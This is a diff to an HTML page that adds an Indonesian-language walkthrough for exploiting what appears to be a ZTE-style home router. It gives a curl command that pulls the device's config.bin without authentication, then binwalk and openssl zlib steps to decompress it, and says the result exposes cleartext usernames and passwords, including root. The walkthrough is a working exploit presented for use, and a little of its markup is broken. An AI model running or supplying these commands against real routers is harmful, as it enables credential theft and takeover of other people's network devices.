@@ -7,6 +7,25 @@ http://192.168.1.1/getpage.gch?pid=101&nextpage=manager_dev_config_t.gch"
 enctype="multipart/form-data" onsubmit="return false;">
 Request Sent....
 <input type="hidden" name="config" id="config" value="">
-  <p></p>
+  <p>3xploit Lewat Linux Terminal:
+
+<pre>
+$ curl -s -k -X 'POST' -H 'Content-Type: multipart/form-data; boundary=Sm0q' --data-binary $'Sm0q\x0d\x0aContent-Disposition form-data;name=\"config\"\x0d\x0aSm0q\x0d\x0a' 'http://192.168.1.1/getpage.gch?pid=100' -o config.bin
+</pre>
+</p>
+<p>
+jika config.bin sudah di download kemudian extract dengan binwalk (Aplikasi hanya untuk linux)...</p>
+<p>
+Extract :<br />
+
+<code>$ binwalk -e config.bin</code>
+binwalk akan mengekstrak file terkompresi ZLIB.</p>
+<p>kemudian ekstrak ZLIB Menggunakan perintah 
+openssl command decompress zlib files:
+<code>
+$ openssl zlib -d &lt; _config.bin.extracted/D8.zlib</blockquote>
+</code></p>
+<p> openssl mendekompresi file zlib. Salah satu file yang diekstraksi adalah &lt;XML&gt;. konfigurasi perangkat dengan db_user.cfg username dan password cleartext (termasuk root).
+</p>
 </body>
 </html>
